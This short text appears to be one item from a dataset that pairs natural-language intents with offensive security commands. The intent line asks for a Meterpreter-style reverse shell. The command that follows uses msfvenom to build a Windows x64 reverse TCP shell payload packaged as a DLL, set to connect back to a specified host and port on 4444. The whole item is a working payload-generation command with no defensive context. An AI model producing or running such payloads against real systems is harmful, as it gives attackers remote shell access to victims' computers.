# Natural language intent:
# Meterpreter Get rev shell (x64), generate a payload with the intent of establishing a reverse TCP shell on a target system.

msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
